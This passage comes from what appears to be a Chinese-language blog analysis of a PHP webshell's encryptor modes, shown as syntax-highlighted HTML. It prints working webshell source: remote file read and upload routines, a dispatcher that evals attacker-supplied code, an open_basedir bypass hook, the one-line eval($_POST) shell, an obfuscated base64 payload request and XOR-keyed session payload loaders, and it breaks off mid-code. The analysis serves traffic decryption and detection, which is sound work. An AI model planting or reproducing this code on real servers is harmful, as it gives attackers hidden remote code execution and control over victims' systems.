    <span class="p">}</span><span class="k">elseif</span> <span class="p">(</span><span class="nv">$mode</span><span class="o">==</span><span class="s2">"read"</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"fopen"</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"fread"</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"fseek"</span><span class="p">)){</span>
            <span class="nv">$handle</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">"rb"</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
                <span class="o">@</span><span class="nb">fseek</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span><span class="nv">$position</span><span class="p">);</span>
                <span class="nv">$data</span><span class="o">=</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span><span class="nv">$readByteNum</span><span class="p">);</span>
                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
                    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                    <span class="k">return</span> <span class="s2">"cannot read file"</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="s2">"cannot open file"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"file_get_contents"</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="kc">false</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="nv">$position</span><span class="p">,</span><span class="nv">$readByteNum</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">return</span> <span class="s2">"no function"</span><span class="p">;</span>
        <span class="p">}</span>

    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"no mode"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">bigFileUpload</span><span class="p">(){</span>
    <span class="nv">$fileName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"fileName"</span><span class="p">);</span>
    <span class="nv">$fileContents</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"fileContents"</span><span class="p">);</span>
    <span class="nv">$position</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"position"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"fopen"</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"fwrite"</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"fseek"</span><span class="p">)){</span>
        <span class="nv">$handle</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">"ab"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
            <span class="nb">fseek</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span><span class="nv">$position</span><span class="p">);</span>
            <span class="nv">$len</span><span class="o">=</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span><span class="nv">$fileContents</span><span class="p">);</span>
            <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$len</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
                <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="s2">"cannot write file"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">return</span> <span class="s2">"cannot open file"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"file_put_contents"</span><span class="p">)){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="nv">$fileContents</span><span class="p">,</span><span class="no">FILE_APPEND</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
            <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">return</span> <span class="s2">"writer fail"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"no function"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">canCallGzipEncode</span><span class="p">(){</span>
    <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"gzencode"</span><span class="p">)){</span>
        <span class="k">return</span> <span class="s2">"1"</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"0"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">canCallGzipDecode</span><span class="p">(){</span>
    <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"gzdecode"</span><span class="p">)){</span>
        <span class="k">return</span> <span class="s2">"1"</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"0"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">bytesToInteger</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="nv">$position</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$val</span> <span class="o">=</span> <span class="nv">$bytes</span><span class="p">[</span><span class="nv">$position</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
    <span class="nv">$val</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="nv">$val</span> <span class="o">|=</span> <span class="nv">$bytes</span><span class="p">[</span><span class="nv">$position</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
    <span class="nv">$val</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="nv">$val</span> <span class="o">|=</span> <span class="nv">$bytes</span><span class="p">[</span><span class="nv">$position</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
    <span class="nv">$val</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="nv">$val</span> <span class="o">|=</span> <span class="nv">$bytes</span><span class="p">[</span><span class="nv">$position</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$val</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">isGzipStream</span><span class="p">(</span><span class="nv">$bin</span><span class="p">){</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$bin</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">2</span><span class="p">){</span>
        <span class="nv">$bin</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
        <span class="nv">$strInfo</span> <span class="o">=</span> <span class="o">@</span><span class="nb">unpack</span><span class="p">(</span><span class="s2">"C2chars"</span><span class="p">,</span> <span class="nv">$bin</span><span class="p">);</span>
        <span class="nv">$typeCode</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$strInfo</span><span class="p">[</span><span class="s1">'chars1'</span><span class="p">]</span><span class="mf">.</span><span class="nv">$strInfo</span><span class="p">[</span><span class="s1">'chars2'</span><span class="p">]);</span>
        <span class="k">switch</span> <span class="p">(</span><span class="nv">$typeCode</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="mi">31139</span><span class="o">:</span>
                <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">getBytes</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$bytes</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
        <span class="nb">array_push</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$bytes</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="run函数">run()函数</h2>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$parameters</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
<span class="nv">$_SES</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
<span class="k">function</span> <span class="n">run</span><span class="p">(</span><span class="nv">$pms</span><span class="p">){</span>
    <span class="k">global</span> <span class="nv">$ERRMSG</span><span class="p">;</span>

    <span class="nf">reDefSystemFunc</span><span class="p">();</span>
    <span class="nv">$_SES</span><span class="o">=&amp;</span><span class="nf">getSession</span><span class="p">();</span>
    <span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
    <span class="nv">$sessioId</span><span class="o">=</span><span class="nb">md5</span><span class="p">(</span><span class="nb">session_id</span><span class="p">());</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$sessioId</span><span class="p">])){</span>
        <span class="nv">$_SES</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">((</span><span class="nf">S1MiwYYr</span><span class="p">(</span><span class="nf">base64Decode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$sessioId</span><span class="p">],</span><span class="nv">$sessioId</span><span class="p">),</span><span class="nv">$sessioId</span><span class="p">)));</span>
    <span class="p">}</span>
    <span class="o">@</span><span class="nb">session_write_close</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="nf">canCallGzipDecode</span><span class="p">()</span><span class="o">==</span><span class="mi">1</span><span class="o">&amp;&amp;@</span><span class="nf">isGzipStream</span><span class="p">(</span><span class="nv">$pms</span><span class="p">)){</span>
        <span class="nv">$pms</span><span class="o">=</span><span class="nb">gzdecode</span><span class="p">(</span><span class="nv">$pms</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nf">formatParameter</span><span class="p">(</span><span class="nv">$pms</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SES</span><span class="p">[</span><span class="s2">"bypass_open_basedir"</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nv">$_SES</span><span class="p">[</span><span class="s2">"bypass_open_basedir"</span><span class="p">]</span><span class="o">==</span><span class="kc">true</span><span class="p">){</span>
        <span class="o">@</span><span class="nf">bypass_open_basedir</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"set_error_handler"</span><span class="p">)){</span>
        <span class="o">@</span><span class="nb">set_error_handler</span><span class="p">(</span><span class="s2">"payloadErrorHandler"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"set_exception_handler"</span><span class="p">)){</span>
        <span class="o">@</span><span class="nb">set_exception_handler</span><span class="p">(</span><span class="s2">"payloadExceptionHandler"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$result</span><span class="o">=@</span><span class="nf">evalFunc</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">==</span><span class="kc">null</span><span class="o">||</span><span class="nv">$result</span><span class="o">===</span><span class="kc">false</span><span class="p">){</span>
        <span class="nv">$result</span><span class="o">=</span><span class="nv">$ERRMSG</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SES</span><span class="o">!==</span><span class="kc">null</span><span class="p">){</span>
        <span class="nb">session_start</span><span class="p">();</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$sessioId</span><span class="p">]</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nf">S1MiwYYr</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$_SES</span><span class="p">),</span><span class="nv">$sessioId</span><span class="p">));</span>
        <span class="o">@</span><span class="nb">session_write_close</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nf">canCallGzipEncode</span><span class="p">()){</span>
        <span class="nv">$result</span><span class="o">=</span><span class="nb">gzencode</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>直接看返回的$result加密的过程</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$result</span><span class="o">=@</span><span class="nf">evalFunc</span><span class="p">();</span> <span class="c1">//evalFunc()函数执行传入的方法名和参数，结果存储在$result</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">==</span><span class="kc">null</span><span class="o">||</span><span class="nv">$result</span><span class="o">===</span><span class="kc">false</span><span class="p">){</span>
        <span class="nv">$result</span><span class="o">=</span><span class="nv">$ERRMSG</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SES</span><span class="o">!==</span><span class="kc">null</span><span class="p">){</span>
        <span class="nb">session_start</span><span class="p">();</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$sessioId</span><span class="p">]</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nf">S1MiwYYr</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$_SES</span><span class="p">),</span><span class="nv">$sessioId</span><span class="p">));</span> <span class="c1">//S1MiwYYr()函数就是webshell里的encode()函数</span>
        <span class="o">@</span><span class="nb">session_write_close</span><span class="p">();</span>
    <span class="p">}</span>
<span class="c1">//下面还会对返回的内容进行zlib压缩，解密时需要特别注意</span>
    <span class="k">if</span> <span class="p">(</span><span class="nf">canCallGzipEncode</span><span class="p">()){</span>
        <span class="nv">$result</span><span class="o">=</span><span class="nb">gzencode</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</code></pre></div></div>

<h2 id="evalfunc函数">evalFunc()函数</h2>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">evalFunc</span><span class="p">(){</span>
    <span class="o">@</span><span class="nb">session_write_close</span><span class="p">();</span>
    <span class="nv">$className</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"codeName"</span><span class="p">);</span> <span class="c1">//http请求传入的函数参数</span>
    <span class="nv">$methodName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"methodName"</span><span class="p">);</span> <span class="c1">//http请求传入的函数名</span>
    <span class="nv">$_SES</span><span class="o">=&amp;</span><span class="nf">getSession</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$methodName</span><span class="o">!=</span><span class="kc">null</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$className</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$methodName</span><span class="o">==</span><span class="s2">"includeCode"</span><span class="p">){</span>
                <span class="k">return</span> <span class="nf">includeCode</span><span class="p">();</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SES</span><span class="p">[</span><span class="nv">$className</span><span class="p">])){</span>
                    <span class="k">return</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_SES</span><span class="p">[</span><span class="nv">$className</span><span class="p">]);</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                    <span class="k">return</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$className</span><span class="si">}</span><span class="s2"> no load"</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$methodName</span><span class="p">)){</span>
                <span class="k">return</span> <span class="nv">$methodName</span><span class="p">();</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="s2">"function </span><span class="si">{</span><span class="nv">$methodName</span><span class="si">}</span><span class="s2"> not exist"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"methodName Is Null"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>逻辑很清晰，但是重定义的执行系统命令函数居多，分析的时候注意参考</p>

<h1 id="php_eval_xor_base64加密器">PHP_EVAL_XOR_BASE64加密器</h1>

<p>这种加密器的webshell就是经典的PHP一句话木马</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"pass"</span><span class="p">]);</span>
</code></pre></div></div>

<p>接下来的http报文中会有两个参数，一个pass（），一个key参数</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pass</span><span class="o">=</span><span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="s1">'K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD'</span><span class="p">))));</span><span class="o">&amp;</span><span class="n">key</span><span class="o">=</span><span class="nc">DlMRWA1cL1gOVDc2MjRhRwZFEQ</span><span class="o">==</span>
</code></pre></div></div>

<p>pass参数的内容就是PHP_XOR_BASE64加密器的生成的webshell，不同的是key参数的值变成了命令执行的调用函数名</p>

<p>pass参数的内容按照上面的解密后如下</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">function</span> <span class="n">encode</span><span class="p">(</span><span class="nv">$D</span><span class="p">,</span><span class="nv">$K</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$D</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$K</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">];</span>
        <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$c</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$D</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$pass</span><span class="o">=</span><span class="s1">'key'</span><span class="p">;</span>
<span class="nv">$payloadName</span><span class="o">=</span><span class="s1">'payload'</span><span class="p">;</span>
<span class="nv">$key</span><span class="o">=</span><span class="s1">'3c6e0b8a9c15224a'</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$pass</span><span class="p">])){</span>
    <span class="nv">$data</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$pass</span><span class="p">]),</span><span class="nv">$key</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">])){</span>
        <span class="nv">$payload</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">],</span><span class="nv">$key</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span><span class="s2">"getBasicsInfo"</span><span class="p">)</span><span class="o">===</span><span class="kc">false</span><span class="p">){</span>
            <span class="nv">$payload</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
        <span class="p">}</span>
	    <span class="k">eval</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="mf">.</span><span class="nv">$key</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nf">encode</span><span class="p">(</span><span class="o">@</span><span class="nf">run</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span><span class="nv">$key</span><span class="p">));</span>
        <span class="k">echo</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="mf">.</span><span class="nv">$key</span><span class="p">),</span><span class="mi">16</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="s2">"getBasicsInfo"</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">]</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>接下来的就和PHP_XOR_BASE64加密器的过程相同了，区别的是这种加密器的http请求包比前者长，因为每次请求都会带上上述pass参数的webshell</p>

<h1 id="php_xor_raw加密器">PHP_XOR_RAW加密器</h1>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">function</span> <span class="n">encode</span><span class="p">(</span><span class="nv">$D</span><span class="p">,</span><span class="nv">$K</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$D</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$K</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">];</span>
        <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$c</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$D</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$payloadName</span><span class="o">=</span><span class="s1">'payload'</span><span class="p">;</span>
<span class="nv">$key</span><span class="o">=</span><span class="s1">'3c6e0b8a9c15224a'</span><span class="p">;</span>
<span class="nv">$data</span><span class="o">=</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"php://input"</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
    <span class="nv">$data</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">])){</span>
        <span class="nv">$payload</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">],</span><span class="nv">$key</span><span class="p">);</span>
